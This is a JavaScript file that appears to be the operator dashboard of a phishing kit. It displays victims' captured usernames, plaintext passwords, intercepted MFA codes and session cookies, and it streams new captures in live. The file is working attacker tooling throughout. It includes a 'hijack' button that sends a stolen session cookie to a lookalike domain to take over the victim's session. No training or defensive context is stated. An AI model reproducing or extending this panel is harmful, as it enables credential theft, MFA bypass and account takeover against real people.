const list = document.getElementById("stolen-list");
const placeholder = document.getElementById("no-data-placeholder");
const template = document.getElementById("credential-card-tpl");

// username -> { el, data }
const cards = new Map();

function applyData(el, data) {
  el.querySelector('[data-field="username"]').textContent = data.username;
  el.querySelector(
      '[data-field="captures"]').textContent = `${data.nCaptures} capture(s)`;
  el.querySelector('[data-field="time"]').textContent = data.lastCapturedAt;
  el.querySelector('[data-field="password"]').textContent = data.password;

  const mfaField = el.querySelector('[data-field="mfa-field"]');
  const mfaBadge = el.querySelector('[data-field="mfa-badge"]');
  const mfaCode = el.querySelector('[data-field="mfa-code"]');
  if (data.mfaCode) {
    mfaField.hidden = false;
    mfaBadge.textContent = "Intercepted";
    mfaCode.textContent = data.mfaCode;
  } else {
    mfaField.hidden = true;
  }

  const badge = el.querySelector('[data-field="session-badge"]');
  const session = el.querySelector('[data-field="session"]');
  const btn = el.querySelector('[data-action="hijack"]');

  if (data.sessionCookie) {
    badge.className = "badge active";
    badge.textContent = "Captured";
    session.textContent = data.sessionCookie;
    btn.disabled = false;
  } else {
    badge.className = "badge missing";
    badge.textContent = "Missing";
    session.textContent = "Waiting for successful login...";
    btn.disabled = true;
  }
}

function upsertCredential(data) {
  placeholder.hidden = true;

  let entry = cards.get(data.username);
  if (!entry) {
    const el = template.content.firstElementChild.cloneNode(true);
    el.dataset.username = data.username;
    list.prepend(el);
    entry = {el};
    cards.set(data.username, entry);
  }

  entry.data = data;
  applyData(entry.el, data);
}

// Event delegation: one listener for every (current and future) hijack button.
list.addEventListener("click", (e) => {
  const btn = e.target.closest('[data-action="hijack"]');
  if (!btn) {
    return;
  }
  const li = btn.closest("[data-username]");
  const cookie = cards.get(li?.dataset.username)?.data?.sessionCookie;
  if (!cookie) {
    return;
  }
  window.open(
      `https://krabsvau1t.com/hijack?cookie=${encodeURIComponent(cookie)}`,
      "_blank",
  );
});

async function loadInitial() {
  try {
    const res = await fetch("/stolen/api/credentials");
    const credentials = await res.json();
    credentials.forEach(upsertCredential);
  } catch (err) {
    console.error("Failed to load credentials:", err);
  }
}

const eventSource = new EventSource("/stolen/api/events");

eventSource.addEventListener("credential-captured", (e) => {
  try {
    upsertCredential(JSON.parse(e.data));
  } catch (err) {
    console.error("Failed to parse event data:", err);
  }
});

eventSource.onerror = (err) => {
  console.error("SSE connection error, retrying...", err);
};

await loadInitial();
